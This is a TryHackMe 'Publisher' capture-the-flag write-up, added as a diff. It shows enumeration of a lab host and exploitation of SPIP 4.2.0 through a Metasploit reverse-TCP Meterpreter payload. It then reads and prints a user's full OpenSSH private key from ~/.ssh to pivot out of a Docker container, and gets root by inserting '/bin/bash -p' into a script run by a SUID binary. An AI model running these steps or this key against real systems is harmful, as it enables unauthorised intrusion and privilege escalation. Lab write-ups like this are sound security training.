@@ -1,0 +1,418 @@
+---
+title: TryHackMe Publisher
+description: Writeup
+---
+
+## Overview
+- **Machine Name:** Publisher
+- **OS:** Linux
+- **Difficulty:** Easy
+
+## Summary
+
+On the machine "Publisher", we started by enumerating and discovering SPIP version 4.2.0, which had a known RCE exploit. Using this exploit, we gained initial access and found ourselves in a Docker container. Then escaped the container by leveraging an SSH connection with a found ID RSA key. Finally, we achieved privilege escalation by modifying a script to gain root access.
+
+## Reconnaissance
+### Nmap Scan Results
+
+```java
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
+|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
+|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
+80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Publisher's Pulse: SPIP Insights & Tips
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jul  3 13:20:44 2024 -- 1 IP address (1 host up) scanned in 12.16 seconds
+```
+
+We can see that only ports 22 (SSH) and 80 (HTTP) are open. Let's check the website to see what we can find !
+
+### Directory Enumeration
+
+```java
+403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+301      GET        9l       28w      313c http://10.10.94.102/images => http://10.10.94.102/images/
+200      GET       32l      224w    17917c http://10.10.94.102/images/ads.jpg
+200      GET      354l      770w     5959c http://10.10.94.102/style.css
+200      GET       81l      462w    49772c http://10.10.94.102/images/bottom_panel_bg.jpg
+200      GET      142l      610w    69796c http://10.10.94.102/images/image_02.jpg
+200      GET      237l     1368w   110318c http://10.10.94.102/images/image_01.jpg
+200      GET      150l      766w     8686c http://10.10.94.102/
+200      GET      150l      766w     8686c http://10.10.94.102/index.html
+200      GET      109l      602w    53555c http://10.10.94.102/images/logo.jpg
+200      GET       69l       74w     4051c http://10.10.94.102/images/comment_icon.jpg
+200      GET        8l       45w     3539c http://10.10.94.102/images/180_column_bg.jpg
+200      GET        7l       13w      379c http://10.10.94.102/images/menu_bg_repeat.jpg
+200      GET       17l       96w     5807c http://10.10.94.102/images/templatmeo_column_two_bg.jpg
+[###>----------------] - 48s    23952/133015  3m      found:15      errors:0
+[###>----------------] - 48s    23810/132920  494/s   http://10.10.94.102/
+301      GET        9l       28w      311c http://10.10.94.102/spip => http://10.10.94.102/spip/
+301      GET        9l       28w      318c http://10.10.94.102/spip/config => http://10.10.94.102/spip/config/
+301      GET        9l       28w      315c http://10.10.94.102/spip/tmp => http://10.10.94.102/spip/tmp/
+```
+
+We can see an interesting directory.
+
+```java
+http://10.10.94.102/spip/
+```
+While checking on Wappalyzer https://www.wappalyzer.com/, we found that the webpage is running SPIP 4.2.0. Let's check if there are any vulnerabilities or exploits available for this version.
+
+```java
+searchsploit SPIP 4.2.0
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+SPIP v4.2.0 - Remote Code Execution (Unauthen | php/webapps/51536.py
+---------------------------------------------- ---------------------------------
+```
+And yes! We found an RCE exploit for SPIP 4.2.0.
+
+## Exploitation
+### Vulnerabilities Exploited
+Lets procceed with the explotation with Metasploit 
+```java
+msf6 > search SPIP
+
+Matching Modules
+================
+
+   #  Name                                     Disclosure Date  Rank       Check  Description
+   -  ----                                     ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/spip_connect_exec    2012-07-04       excellent  Yes    SPIP connect Parameter PHP Injection
+   1  exploit/unix/webapp/spip_rce_form        2023-02-27       excellent  Yes    SPIP form PHP Injection
+   2    \_ target: Automatic (PHP In-Memory)   .                .          .      .
+   3    \_ target: Automatic (Unix In-Memory)  .                .          .      .
+
+
+Interact with a module by name or index. For example info 3, use 3 or use exploit/unix/webapp/spip_rce_form
+After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Unix In-Memory)'
+
+msf6 > use 2
+[*] Additionally setting TARGET => Automatic (PHP In-Memory)
+[*] Using configured payload php/meterpreter/reverse_tcp
+msf6 exploit(unix/webapp/spip_rce_form) >
+```
+
+```java
+msf6 exploit(unix/webapp/spip_rce_form) > set RHOSTS 10.10.94.102
+RHOSTS => 10.10.94.102
+msf6 exploit(unix/webapp/spip_rce_form) > set TARGETURI /spip
+TARGETURI => /spip
+```
+
+```java
+msf6 exploit(unix/webapp/spip_rce_form) > exploit
+
+[*] Started reverse TCP handler on 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] SPIP Version detected: 4.2.0
+[+] The target appears to be vulnerable.
+[*] Got anti-csrf token: AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
+[*] 10.10.94.102:80 - Attempting to exploit...
+[*] Sending stage (39927 bytes) to 10.10.94.102
+[*] Meterpreter session 1 opened -> 10.10.94.102:44302) at 2024-07-03 14:20:11 +0200
+
+meterpreter >
+```
+
+```java
+meterpreter > shell
+Process 412 created.
+Channel 0 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+We're in as `www-data`. Let's conduct enumeration; checking the hostname reveals that we're in a Docker container.
+```java
+www-data@41c976e507f8:/home/think/spip/spip$ hostname
+hostname
+41c976e507f8
+```
+
+If we navigate back two directories, we can find the user flag.
+
+```java
+www-data@41c976e507f8:/home/think$ ls
+ls
+spip  user.txt
+```
+
+While enumerating to escape Docker, I discovered an `.ssh` directory in the home folder containing an `id_rsa` key. This enabled us to establish an SSH connection and successfully escape Docker.
+
+```java
+www-data@41c976e507f8:/home/think$ ls -la
+ls -la
+total 48
+drwxr-xr-x 8 think    think    4096 Feb 10 21:27 .
+drwxr-xr-x 1 root     root     4096 Dec  7  2023 ..
+lrwxrwxrwx 1 root     root        9 Jun 21  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 think    think     220 Nov 14  2023 .bash_logout
+-rw-r--r-- 1 think    think    3771 Nov 14  2023 .bashrc
+drwx------ 2 think    think    4096 Nov 14  2023 .cache
+drwx------ 3 think    think    4096 Dec  8  2023 .config
+drwx------ 3 think    think    4096 Feb 10 21:22 .gnupg
+drwxrwxr-x 3 think    think    4096 Jan 10 12:46 .local
+-rw-r--r-- 1 think    think     807 Nov 14  2023 .profile
+lrwxrwxrwx 1 think    think       9 Feb 10 21:27 .python_history -> /dev/null
+drwxr-xr-x 2 think    think    4096 Jan 10 12:54 .ssh
+lrwxrwxrwx 1 think    think       9 Feb 10 21:27 .viminfo -> /dev/null
+drwxr-x--- 5 www-data www-data 4096 Dec 20  2023 spip
+-rw-r--r-- 1 root     root       35 Feb 10 21:20 user.txt
+```
+
+```java
+www-data@41c976e507f8:/home/think/.ssh$ ls
+ls
+authorized_keys  id_rsa  id_rsa.pub
+www-data@41c976e507f8:/home/think/.ssh$ cat id_rsa
+cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Let's copy `id_rsa` and `id_rsa.pub` to our local machine and connect via SSH. The `id_rsa.pub` file indicates it's associated with the user 'think'. 
+
+```java
+chmod 600 id_rsa
+```
+
+```java
+ssh -i id_rsa think@IP 
+```
+
+Voila! We're now connected via SSH. So far, this machine has been quite straightforward. Let's proceed with privilege escalation enumeration to identify how we can elevate our privileges and gain root.
+
+```java
+ssh -i id_rsa think@10.10.94.102
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 03 Jul 2024 12:32:04 PM UTC
+
+  System load:                      0.0
+  Usage of /:                       76.6% of 9.75GB
+  Memory usage:                     36%
+  Swap usage:                       0%
+  Processes:                        151
+  Users logged in:                  0
+  IPv4 address for br-72fdb218889f: 172.18.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.94.102
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+think@publisher:~$
+```
+## Post-Exploitation
+
+### Privilege Escalation via Script Modification
+
+#### Initial Discovery and Enumeration
+1. **Initial Upload and Enumeration:**
+   - Uploaded `linpeas.sh` to the target machine to perform comprehensive enumeration.
+
+2. **Identifying SUID Binary:**
+   - Discovered `/usr/sbin/run_container` as a SUID binary (`-rwsr-sr-x`), indicating it runs with root privileges.
+
+#### Script Analysis and Modification
+3. **Analyzing `/opt/run_container.sh`:**
+   - Examined the script used by `/usr/sbin/run_container` to manage Docker containers.
+
+   ```bash
+   # Contents of /opt/run_container.sh
+   #!/bin/bash
+   
+   # Function to list Docker containers
+   list_containers() {
+       if [ -z "$(docker ps -aq)" ]; then
+           docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
+       fi
+       echo "List of Docker containers:"
+       docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
+       echo ""
+   }
+   
+   # Function to prompt user for container ID
+   prompt_container_id() {
+       read -p "Enter the ID of the container or leave blank to create a new one: " container_id
+       validate_container_id "$container_id"
+   }
+   
+   # Function to display options and perform actions
+   select_action() {
+       echo ""
+       echo "OPTIONS:"
+       local container_id="$1"
+       PS3="Choose an action for a container: "
+       options=("Start Container" "Stop Container" "Restart Container" "Create Container" "Quit")
+   
+       select opt in "${options[@]}"; do
+           case $REPLY in
+               1) docker start "$container_id"; break ;;
+               2) 	if [ $(docker ps -q | wc -l) -lt 2 ]; then
+   	            echo "No enough containers are currently running."
+       	            exit 1
+   		fi
+                   docker stop "$container_id"
+                   break ;;
+               3) docker restart "$container_id"; break ;;
+               4) echo "Creating a new container..."
+                  docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest
+                  break ;;
+               5) echo "Exiting..."; exit ;;
+               *) echo "Invalid option. Please choose a valid option." ;;
+           esac
+       done
+   }
+   
+   # Main script execution
+   list_containers
+   prompt_container_id  # Get the container ID from prompt_container_id function
+   select_action "$container_id"  # Pass the container ID to select_action function
+   ```
+
+4. **Modifying the Script:**
+   - Edited `/opt/run_container.sh` to include `/bin/bash -p` in the `prompt_container_id()` function. This insertion granted a root shell when executed.
+
+   ```bash
+   # Modified /opt/run_container.sh
+   #!/bin/bash
+   
+   # Function to list Docker containers
+   list_containers() {
+       if [ -z "$(docker ps -aq)" ]; then
+           docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
+       fi
+       echo "List of Docker containers:"
+       docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
+       echo ""
+   }
+   
+   # Function to prompt user for container ID
+   prompt_container_id() {
+       /bin/bash -p  # Inserted command for privilege escalation
+       read -p "Enter the ID of the container or leave blank to create a new one: " container_id
+       validate_container_id "$container_id"
+   }
+   
+   # Function to display options and perform actions
+   select_action() {
+       echo ""
+       echo "OPTIONS:"
+       local container_id="$1"
+       PS3="Choose an action for a container: "
+       options=("Start Container" "Stop Container" "Restart Container" "Create Container" "Quit")
+   
+       select opt in "${options[@]}"; do
+           case $REPLY in
+               1) docker start "$container_id"; break ;;
+               2) 	if [ $(docker ps -q | wc -l) -lt 2 ]; then
+   	            echo "No enough containers are currently running."
+       	            exit 1
+   		fi
+                   docker stop "$container_id"
+                   break ;;
+               3) docker restart "$container_id"; break ;;
+               4) echo "Creating a new container..."
+                  docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest
+                  break ;;
+               5) echo "Exiting..."; exit ;;
+               *) echo "Invalid option. Please choose a valid option." ;;
+           esac
+       done
+   }
+   
+   # Main script execution
+   list_containers
+   prompt_container_id  # Get the container ID from prompt_container_id function
+   select_action "$container_id"  # Pass the container ID to select_action function
+   ```
+
+#### Exploitation and Root Access
+5. **Executing the Modified Script:**
+   - Copied the modified `/opt/run_container.sh` to `/dev/shm` and then replaced the original script.
+
+   ```java
+   think@publisher:/dev/shm$ cp /opt/run_container.sh /dev/shm
+   think@publisher:/dev/shm$ cp run_container.sh /opt/run_container.sh
+   ```
+
+6. **Gaining Root Access:**
+   - Executed `/usr/sbin/run_container`, which invoked the modified script.
+   - Successfully obtained a root shell (`bash-5.0#`) due to the insertion of `/bin/bash -p` in the script.
+
+   ```java
+   think@publisher:/dev/shm$ /usr/sbin/run_container
+   List of Docker containers:
+   ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 2 hours
+   bash-5.0# whoami
+   root
+   ```
+
+---
+
